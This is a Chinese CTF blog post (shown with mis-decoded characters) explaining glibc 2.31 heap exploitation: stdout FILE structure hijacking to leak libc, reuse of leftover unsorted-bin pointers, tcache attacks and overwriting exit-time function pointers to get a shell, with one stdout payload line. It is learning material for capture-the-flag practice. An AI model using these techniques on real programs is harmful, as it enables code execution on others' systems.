<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"a2ur2.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ä¸€ã€å‰è¨€æ—¶éš”ä¸€ä¸ªæœˆæŸæœ‰æ›´æ–°åšå®¢äº†ï¼Œä¸Šä¸€æ¬¡æé‚£ä¸ªpatchelfè°ƒäº†å¿«åŠä¸ªæ˜ŸæœŸæ²¡å¼„å¥½ä¹‹åå¿ƒæ€å¤§å´©ï¼Œä¸€ä¸‹å­åŠ¨åŠ›å¤±å»ï¼Œç›´æ¥æ‘†çƒ‚äº†ä¸€æ•´ä¸ªäº”ä¸€ã€‚äº”ä¸€è¿‡åæ²¡å¤šä¹…ï¼Œè¢«uuuå¸ˆå‚…ç‹ ç‹ çš„æ‰“å‡»åˆ°äº†orzï¼Œåˆæ¡èµ·æ¥äº†ç»§ç»­pwnã€‚ç„¶åç´§æ¥ç€å°±æ˜¯çœèµ›ï¼Œçœ‹äº†ä¸‹å»å¹´çš„çœèµ›ä¸¤é¢˜éƒ½æ˜¯2.31çš„å †ï¼Œéƒ½æ˜¯æ²¡æœ‰è¾“å‡ºå‡½æ•°è¦æ‰“stdoutå»è¾“å‡ºï¼Œæœ€ååŠ«æŒtcacheå»getshellï¼Œå½“æ—¶ä¸€çœ‹å·®ç‚¹ç›´æ¥æ™•å¥ï¼Œåé¢ä¸€ä¸ªå¤šæ˜ŸæœŸé€Ÿæˆå®Œäº†tcache">
<meta property="og:type" content="article">
<meta property="og:title" content="stdoutï¼Œtcacheå’Œexit hookä¸€é”…ç«¯">
<meta property="og:url" content="https://a2ur2.github.io/2022/05/25/%E5%88%9D%E6%8E%A2IO%20FILE%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8Eexit%20hook%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="A2ur2çš„æ¢¦æƒ³å°å±‹">
<meta property="og:description" content="ä¸€ã€å‰è¨€æ—¶éš”ä¸€ä¸ªæœˆæŸæœ‰æ›´æ–°åšå®¢äº†ï¼Œä¸Šä¸€æ¬¡æé‚£ä¸ªpatchelfè°ƒäº†å¿«åŠä¸ªæ˜ŸæœŸæ²¡å¼„å¥½ä¹‹åå¿ƒæ€å¤§å´©ï¼Œä¸€ä¸‹å­åŠ¨åŠ›å¤±å»ï¼Œç›´æ¥æ‘†çƒ‚äº†ä¸€æ•´ä¸ªäº”ä¸€ã€‚äº”ä¸€è¿‡åæ²¡å¤šä¹…ï¼Œè¢«uuuå¸ˆå‚…ç‹ ç‹ çš„æ‰“å‡»åˆ°äº†orzï¼Œåˆæ¡èµ·æ¥äº†ç»§ç»­pwnã€‚ç„¶åç´§æ¥ç€å°±æ˜¯çœèµ›ï¼Œçœ‹äº†ä¸‹å»å¹´çš„çœèµ›ä¸¤é¢˜éƒ½æ˜¯2.31çš„å †ï¼Œéƒ½æ˜¯æ²¡æœ‰è¾“å‡ºå‡½æ•°è¦æ‰“stdoutå»è¾“å‡ºï¼Œæœ€ååŠ«æŒtcacheå»getshellï¼Œå½“æ—¶ä¸€çœ‹å·®ç‚¹ç›´æ¥æ™•å¥ï¼Œåé¢ä¸€ä¸ªå¤šæ˜ŸæœŸé€Ÿæˆå®Œäº†tcache">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/25/XAA3Af.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/25/XAdSoV.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEcXRI.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/25/XADlNt.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEJM3d.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEWkJH.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEW0kF.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEWylR.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEWopd.png">
<meta property="og:image" content="https://s1.ax1x.com/2022/05/26/XEocXd.png">
<meta property="article:published_time" content="2022-05-25T11:29:14.000Z">
<meta property="article:modified_time" content="2022-05-26T11:45:33.700Z">
<meta property="article:author" content="A2ur2">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2022/05/25/XAA3Af.png">

<link rel="canonical" href="https://a2ur2.github.io/2022/05/25/%E5%88%9D%E6%8E%A2IO%20FILE%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8Eexit%20hook%E7%9A%84%E5%88%A9%E7%94%A8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>stdoutï¼Œtcacheå’Œexit hookä¸€é”…ç«¯ | A2ur2çš„æ¢¦æƒ³å°å±‹</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">A2ur2çš„æ¢¦æƒ³å°å±‹</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">æˆ‘è®¸ä¸‹çš„æ„¿æœ›è¯¥å‘è°å»è¯´æ˜</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/05/25/%E5%88%9D%E6%8E%A2IO%20FILE%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8Eexit%20hook%E7%9A%84%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="A2ur2">
      <meta itemprop="description" content="åœ¨æˆä¸ºå¤§èµ›pwné¢˜ç­¾åˆ°å‘˜çš„è·¯ä¸Š">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="A2ur2çš„æ¢¦æƒ³å°å±‹">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          stdoutï¼Œtcacheå’Œexit hookä¸€é”…ç«¯
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-25 19:29:14" itemprop="dateCreated datePublished" datetime="2022-05-25T19:29:14+08:00">2022-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-26 19:45:33" itemprop="dateModified" datetime="2022-05-26T19:45:33+08:00">2022-05-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>æ—¶éš”ä¸€ä¸ªæœˆæŸæœ‰æ›´æ–°åšå®¢äº†ï¼Œä¸Šä¸€æ¬¡æé‚£ä¸ªpatchelfè°ƒäº†å¿«åŠä¸ªæ˜ŸæœŸæ²¡å¼„å¥½ä¹‹åå¿ƒæ€å¤§å´©ï¼Œä¸€ä¸‹å­åŠ¨åŠ›å¤±å»ï¼Œç›´æ¥æ‘†çƒ‚äº†ä¸€æ•´ä¸ªäº”ä¸€ã€‚äº”ä¸€è¿‡åæ²¡å¤šä¹…ï¼Œè¢«uuuå¸ˆå‚…ç‹ ç‹ çš„æ‰“å‡»åˆ°äº†orzï¼Œåˆæ¡èµ·æ¥äº†ç»§ç»­pwnã€‚ç„¶åç´§æ¥ç€å°±æ˜¯çœèµ›ï¼Œçœ‹äº†ä¸‹å»å¹´çš„çœèµ›ä¸¤é¢˜éƒ½æ˜¯2.31çš„å †ï¼Œéƒ½æ˜¯æ²¡æœ‰è¾“å‡ºå‡½æ•°è¦æ‰“stdoutå»è¾“å‡ºï¼Œæœ€ååŠ«æŒtcacheå»getshellï¼Œå½“æ—¶ä¸€çœ‹å·®ç‚¹ç›´æ¥æ™•å¥ï¼Œåé¢ä¸€ä¸ªå¤šæ˜ŸæœŸé€Ÿæˆå®Œäº†tcacheå’Œstdoutè¾“å‡ºï¼Œå¯¹è¿™ä¸¤ä¸ªæŠ€å·§æœ‰äº†å¤§è‡´äº†è§£åå°±æ˜¯äº”æœˆçš„dasäº†ï¼Œåˆæ˜¯stdoutè¾“å‡ºï¼ˆ</p>
<p>ç›´æ¥èµ¶è¶Ÿäº†ï¼Œä¸€ç¯‡åšå®¢ä¸€é“é¢˜æå®ŒåŠ«æŒstdoutè¿˜æœ‰æœ€ååˆ©ç”¨tcacheåŠ«æŒåˆ°exit hookå®Œæˆgetshell</p>
<span id="more"></span>

<h2 id="äºŒã€åšé¢˜å‰ç½®çŸ¥è¯†"><a href="#äºŒã€åšé¢˜å‰ç½®çŸ¥è¯†" class="headerlink" title="äºŒã€åšé¢˜å‰ç½®çŸ¥è¯†"></a>äºŒã€åšé¢˜å‰ç½®çŸ¥è¯†</h2><p>å°‘å¹´ï¼Œæˆ‘æƒ³ä½ çœ‹å®Œå‰ç½®çš„çŸ¥è¯†ï¼Œæ‰“é€šä¾‹é¢˜æ¯«æ— ğŸ</p>
<h3 id="1ã€å…³äºIO-FILE"><a href="#1ã€å…³äºIO-FILE" class="headerlink" title="1ã€å…³äºIO FILE"></a>1ã€å…³äºIO FILE</h3><h4 id="åˆè¯†IO-FILE"><a href="#åˆè¯†IO-FILE" class="headerlink" title="åˆè¯†IO FILE"></a>åˆè¯†IO FILE</h4><p>å…³äºIOï¼Œä¸€å¼€å§‹æ˜¯å¬è¯´2.34ç‰ˆæœ¬banæ‰äº†ä¸¤ä¸ªhookä¹‹åï¼ŒåŸºæœ¬éƒ½æ˜¯æ‰“IOå»getshellï¼Œç›´åˆ°ç°åœ¨æˆ‘è¿˜æ²¡æœ‰å®Œå…¨çœ‹æ‡‚å’Œç†è§£IOã€‚</p>
<p>å…³äºIO FILEï¼Œç»“åˆä¼—å¤šå¸ˆå‚…çš„åšå®¢å’Œctfwikiï¼Œæˆ‘ä»¬å¯¹å…¶æœ‰äº†å¤§è‡´çš„äº†è§£ã€‚</p>
<p>IO FILEæœ‰è‹¥å¹²ä¸ªç›¸å…³çš„ç»“æ„ä½“ï¼Œä¾‹å¦‚_IO_FILE_plusç­‰ï¼Œç”¨äºå®ŒæˆIOçš„ç›¸å…³åŠŸèƒ½ï¼ˆå…·ä½“çš„æˆ‘ç›®å‰è¿˜æ²¡æœ‰ä»”ç»†å»äº†è§£ï¼Œå¤§è‡´ç†è§£ä¸ºæ§åˆ¶IOå‡½æ•°å®Œæˆè¾“å‡ºè¾“å…¥ç­‰åŠŸèƒ½ï¼‰ã€‚stdoutå°±æ˜¯å…¶ä¸­ä¸€ä¸ªIOç»“æ„ä½“ã€‚_</p>
<p>_å½“æˆ‘ä»¬è°ƒç”¨putså‡½æ•°æ—¶ï¼Œ <code>_IO_puts</code> å‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨ <code>_IO_sputn</code>ï¼Œç»“æœä¼šæ‰§è¡Œ <code>_IO_new_file_xsputn</code>ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ <code>_IO_overflow</code> ï¼ˆæ‘˜è‡ª<a href=" https://a1ex.online/2020/08/31/IO-FILE%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/ "><strong>A1lx</strong></a>å¸ˆå‚…çš„åšå®¢ï¼‰ï¼Œå½“æˆ‘ä»¬èƒ½æ§åˆ¶stdoutè¿™ä¸ªç»“æ„ä½“é‡Œé¢çš„å†…å®¹ï¼Œç»è¿‡ç‰¹æ®Šå¸ƒå±€ç»•è¿‡æ£€æµ‹åï¼Œå°±èƒ½å¤Ÿè¾“å‡ºä¸€ä¸ªlibcå‡½æ•°çš„åœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºlibcçš„åŸºåœ°å€</p>
<p>stdoutå…¶ä¸­å¸ƒå±€ä¸ºï¼špayload&#x3D;p64(0xfbad1800)+p64(0)*3+â€™\x00â€™æ—¶å³å¯ï¼Œè‡³äºæƒ³ç»†ç©¶ä¸ºä½•ï¼Œä¸Šé¢A1lxå¸ˆå‚…çš„è¿æ¥é‡Œå°±æœ‰ï¼Œå¦‚æœè¦åˆ©ç”¨åªéœ€è¦ç”³è¯·åˆ°stdoutå¸ƒå±€payloadå³å¯</p>
<h4 id="å¦‚ä½•æ‰¾åˆ°stdoutçš„ä½ç½®"><a href="#å¦‚ä½•æ‰¾åˆ°stdoutçš„ä½ç½®" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°stdoutçš„ä½ç½®"></a>å¦‚ä½•æ‰¾åˆ°stdoutçš„ä½ç½®</h4><p>é¦–å…ˆæˆ‘ä»¬æ˜¯å¹¶ä¸çŸ¥é“stdoutç»“æ„ä½“çš„ä½ç½®çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ©ç”¨åˆ°unsorted binçš„æ®‹ç•™æŒ‡é’ˆï¼Œåœ¨å‰é¢æˆ‘ä»¬çŸ¥é“å †å—åœ¨è¿›å…¥unsorted binæ—¶ä¼šæœ‰æŒ‡é’ˆæŒ‡å‘main_arena+96çš„ä½ç½®</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XAA3Af"><img src="https://s1.ax1x.com/2022/05/25/XAA3Af.png" alt="XAA3Af.png"></a></p>
<p>ç„¶åæˆ‘ä»¬å†æ¥åº·åº·æˆ‘ä»¬çš„stdoutç»“æ„ä½“</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XAdSoV"><img src="https://s1.ax1x.com/2022/05/25/XAdSoV.png" alt="XAdSoV.png"></a></p>
<p>å‰é¢çš„0x7ffé‚£ä¸€ä¸²æ˜¯ä¸æ˜¯æƒŠäººçš„ç›¸ä¼¼ï¼Œä¸æ­¤åŒæ—¶åŒä¸€libcçš„ä½ä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å³ä½¿åœ¨åœ°å€éšæœºåŒ–çš„æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“libcçš„ä½ä¸‰ä½æ˜¯å¤šå°‘ï¼Œä¾‹å¦‚æœ¬å›¾ä¸Šå°±æ˜¯0x6a0ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿™ä¸ªå­˜åœ¨unsorted biné‡ŒæŒ‡å‘main_arena+96çš„fdæŒ‡é’ˆï¼Œè¿™é‡Œé¢åªæœ‰ç¬¬å››ä½æˆ‘ä»¬æ˜¯ä¸æ¸…æ¥šæ˜¯å¤šå°‘ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çˆ†ç ´ğŸ’£è¿™ä¸ªç¬¬å››ä½ï¼Œå°±æœ‰1&#x2F;16çš„æ¦‚ç‡è®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬çš„stdoutç»“æ„ä½“ã€‚æ­¤æ—¶åˆ©ç”¨è¿™ä¸ªæ®‹ç•™æŒ‡é’ˆå°±èƒ½ç”³è¯·å †å—åˆ°stdoutç»“æ„ä½“ã€‚</p>
<h4 id="whatâ€™s-æ®‹ç•™çš„fdæŒ‡é’ˆ"><a href="#whatâ€™s-æ®‹ç•™çš„fdæŒ‡é’ˆ" class="headerlink" title="whatâ€™s æ®‹ç•™çš„fdæŒ‡é’ˆ"></a>whatâ€™s æ®‹ç•™çš„fdæŒ‡é’ˆ</h4><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•æŠŠæˆ‘ä»¬çš„å †å—ğŸè¿›stdoutç»“æ„ä½“é‡Œ</p>
<p>è¿™é‡Œæˆ‘è¦ç‰¹åˆ«markä¸€ä¸‹ä»€ä¹ˆå«åš<strong>æ®‹ç•™çš„æŒ‡é’ˆ</strong></p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå½“æˆ‘ä»¬åœ¨tcacheé‡Œé¢æ‰¾ä¸åˆ°ç¬¦åˆç”¨æˆ·ç”³è¯·å¤§å°çš„å †å—æ—¶ï¼Œ<del>ä¼šå»unsorted biné‡Œæ‰¾ï¼Œå¦‚æœæœ‰size&gt;malloc_sizeçš„å †å—ï¼Œå°±ä¼šåˆ‡å‰²è¯¥å †å—ç”¨ä»¥æ»¡è¶³ç”¨æˆ·éœ€æ±‚</del>ã€‚åˆ‡å‰²è¿‡åï¼ŒfdæŒ‡é’ˆå°±ä¼šç§»åŠ¨åˆ°å‰©ä½™çš„ç©ºé—²å †å—é‡Œã€‚å°±æ˜¯è¿™ä¸ª<strong>ç§»åŠ¨</strong>ï¼Œç§»åŠ¨ä¸‹å»åï¼ŒåŸæœ¬çš„åœ°æ–¹ä¸ä¼šå˜æˆ0ï¼Œè€Œæ˜¯ä¼šæ®‹ç•™åŸæœ¬çš„fdæŒ‡é’ˆã€‚</p>
<p>giaoï¼å’Œuuuå¸ˆå‚…ä¸€ç•ªäº¤â™‚æµåï¼Œæˆ‘é¢†æ‚Ÿäº†ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªæ®‹ç•™çš„æŒ‡é’ˆã€‚åŸå› æ˜¯æˆ‘ä»¬mallocçš„æ—¶å€™ï¼Œå½“æˆ‘ä»¬å»å‰²unsortedä¹‹å‰ï¼Œç³»ç»Ÿä¼šéå†æ•´ç†ä¸€éunsorted biné‡Œé¢çš„chunkï¼Œæ‰¾æœ‰æ²¡æœ‰ç›´æ¥ç¬¦åˆmalloc_sizeçš„å †å—ï¼Œå¹¶ä¸”æŒ‰ç…§å¤§å°è®©unsortedé‡Œé¢çš„chunkè¿›å…¥smallæˆ–è€…largebinï¼Œå¦‚æœéå†äº†unsortedåä¾æ—§æ»¡è¶³ä¸äº†ï¼Œå°±ä¼šå»largebiné‡Œæ‰¾ç¬¦åˆsize&gt;malloc_sizeçš„å †å—ï¼Œå¦‚æœæœ‰ï¼Œå°±åˆ‡å‰²è¯¥å †å—ï¼Œå¹¶ä¸”å°†å‰©ä½™çš„éƒ¨åˆ†ä¸¢å›å»unsorted binã€‚å› ä¸ºä¸€å¼€å§‹æ˜¯ä»unsorted binè¿‡æ¥largebinçš„ï¼Œæ‰€ä»¥åˆ‡å‡ºæ¥çš„éƒ¨åˆ†fdåŒºåŸŸå­˜æœ‰ä¸€ä¸ªæŒ‡é’ˆï¼Œå‰©ä½™çš„éƒ¨åˆ†å› ä¸ºä¸¢å›å»äº†unsorted binï¼Œæ‰€ä»¥ä¼šæœ‰ä¸€ä¸ªæŒ‡å‘main_arenaçš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹èµ·æ¥æ‰ä¼šåƒfdè¢«æŒ¤ä¸‹å»äº†ã€‚uuuå¸ˆå‚…tqlå‘œå‘œå‘œ</p>
<p>é™„ä¸Šuuuå¸ˆå‚…è°ƒdemoçš„å›¾ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XEcXRI"><img src="https://s1.ax1x.com/2022/05/26/XEcXRI.png" alt="XEcXRI.png"></a></p>
<p>æ¥ç€å¦‚å›¾ï¼Œå°±èƒ½çœ‹åˆ°æœ‰ä¸¤ä¸ªæŒ‡å‘main_arenaçš„æŒ‡é’ˆï¼š</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XADlNt"><img src="https://s1.ax1x.com/2022/05/25/XADlNt.png" alt="XADlNt.png"></a></p>
<p>åœ¨å‰²äº†0x21å¤§å°çš„å †å—å‡ºæ¥åï¼Œè¯¥0x21å¤§å°çš„å †å—é‡Œæ®‹ç•™ç€ä¸€ä¸ªfdæŒ‡é’ˆï¼Œå¦‚ä½•åˆ©ç”¨</p>
<p>å› æ­¤æˆ‘æ„¿ç§°ä¹‹ä¸ºæ—¶é—´åˆºå®¢-è‰¾å…‹ï¼ˆæœ‰ä¸ªå½±å­</p>
<h3 id="2ã€å…³äºtcache"><a href="#2ã€å…³äºtcache" class="headerlink" title="2ã€å…³äºtcache"></a>2ã€å…³äºtcache</h3><h4 id="tcacheç»“æ„ä½“"><a href="#tcacheç»“æ„ä½“" class="headerlink" title="tcacheç»“æ„ä½“"></a>tcacheç»“æ„ä½“</h4><p>åœ¨glibc2.26ç‰ˆæœ¬ä¹‹åï¼Œå°±åŠ å…¥äº†tcache binç”¨äºç®¡ç†ç©ºé—²çš„å †å—</p>
<p>å…³äºtcache binsï¼Œglibcå®šä¹‰äº† tcache_entryå’Œtcache_perthread_structä¸¤ä¸ªç»“æ„ä½“ç”¨äºç®¡ç†tcache binsï¼Œå¹¶ä¸”tcache structæ˜¯åˆ†é…åˆ°äº†å †ä¸Šï¼Œåœ¨å †æœ€åˆäº§ç”Ÿæ—¶ä¼šåˆ†é…å‡ºä¸€å®šå†…å­˜æ¥ä¿å­˜tcache structï¼Œå¦‚å›¾ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XEJM3d"><img src="https://s1.ax1x.com/2022/05/26/XEJM3d.png" alt="XEJM3d.png"></a></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨2.31ç‰ˆæœ¬ä¸‹è¿™ä¸ª0x291å°±æ˜¯åˆ†é…æ¥ç®¡ç†tcache binsçš„ï¼ˆä¹‹å‰çš„ç‰ˆæœ¬å¤§å°å¥½åƒä¸æ˜¯è¿™ä¸ªï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åŠ«æŒæ•´ä¸ªtcache structå»æ”»å‡»ã€‚</p>
<h4 id="tcacheçš„æ”»å‡»æ‰‹æ®µ"><a href="#tcacheçš„æ”»å‡»æ‰‹æ®µ" class="headerlink" title="tcacheçš„æ”»å‡»æ‰‹æ®µ"></a>tcacheçš„æ”»å‡»æ‰‹æ®µ</h4><p>tcacheå’Œfast binç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨FILOçš„å•é“¾è¡¨æ¥ç»´æŠ¤ï¼ŒèŒƒå›´åœ¨0x20~0x420ï¼Œé»˜è®¤æ¯ä¸€æ¡é“¾è¡¨çš„å¤§å°ä¸º7ï¼Œä½†æ˜¯tcacheå¹¶æ²¡æœ‰fastbinç±»ä¼¼çš„size_checkï¼Œè¿™æ„å‘³ç€é€šè¿‡æˆ‘ä»¬åˆ©ç”¨tcaheå¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æŠŠå †å—ç”³è¯·åˆ°ä»»æ„åœ°å€ä¸Šã€‚è€Œä¸”tcacheå’Œfastbinä¸€æ ·ï¼Œå¯ä»¥æ„é€ double freeã€‚</p>
<p>ä½†æ˜¯åœ¨glibcç‰ˆæœ¬æ›´æ–°åï¼ŒtcacheåŠ å…¥äº†ä¸€äº›æ£€æµ‹ï¼Œå…¶ä¸­åŠ å…¥äº†keyå­—æ®µæŒ‡å‘tcache structï¼Œä»¥æ­¤æ¥é˜²æ­¢double freeã€‚ä¸æ­¤åŒæ—¶ï¼ŒåŠ å…¥äº†countsä½å»è®°å½•è¿™ä¸€æ¡tcache binsé“¾è¡¨é‡Œå­˜å‚¨äº†å¤šå°‘ä¸ªtcacheï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨<a href=" https://a2ur2.github.io/2022/04/11/fastbin%20attacked/#more"><strong>fastbin attacké‚£ç¯‡</strong></a>åšå®¢é‡Œï¼Œæˆ‘ä»¬å–ä¸å‡ºfake_chunkçš„åŸå› ï¼‰ï¼Œè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬é‡Šæ”¾äº†ä¸€ä¸ªchunkè¿›å…¥tcacheï¼Œä¼ªé€ äº†è¿™ä¸ªchunkçš„nextæŒ‡é’ˆåï¼Œæ˜¯ç”³è¯·ä¸å‡ºæ¥è¿™ä¸ªnextæŒ‡é’ˆæŒ‡å‘çš„åŒºåŸŸçš„ï¼Œå› ä¸ºæ­¤æ—¶æˆ‘ä»¬çš„countsä½ä¸º0ï¼Œç³»ç»Ÿè®¤ä¸ºè¿™é‡Œé¢æ²¡æœ‰å †å—äº†ï¼Œè½¬è€Œä»top chunkåˆ‡å‰²ã€‚æ‰€ä»¥æˆ‘ä»¬å¦‚æœæƒ³è¦é¡ºåˆ©å–å‡ºfake_chunkå°±å¾—æ§åˆ¶ä¸‹countsä½ã€‚</p>
<h3 id="3ã€å…³äºexit-hook"><a href="#3ã€å…³äºexit-hook" class="headerlink" title="3ã€å…³äºexit hook"></a>3ã€å…³äºexit hook</h3><p>å®é™…ä¸Šå¹¶æ²¡æœ‰exit hookï¼Œä»–ä¸æ˜¯ä¸€ä¸ªé’©å­å‡½æ•°ï¼Œè€Œæ˜¯åœ¨exitå‡½æ•°è¿›å…¥æ—¶ä¼šè°ƒç”¨çš„ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ(<strong>exit-&gt; __run_exit_handlers -&gt; _dl_fini</strong> è¿™ä¹ˆä¸€æ¡è°ƒç”¨é“¾)</p>
<p>å…³é”®å°±åœ¨è¿™ä¸ªfiniå‡½æ•°ï¼Œå®ƒä¼šè°ƒç”¨rtld_lock_default_lock_recursive å’Œ rtld_lock_default_unlock_recursive å‡½æ•°ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/C/ident/GL">GL</a>(dl_load_lock) çš„ä¼ å‚ã€‚ å› æ­¤æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ä¸¤ç§åˆ©ç”¨exit hookæ¥getshellçš„æ–¹æ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥æ”¹æˆonegadgetï¼Œå¦ä¸€ç§æ˜¯æ”¹æˆsystemå¹¶ä¸”æ§åˆ¶å‚æ•°ã€‚</p>
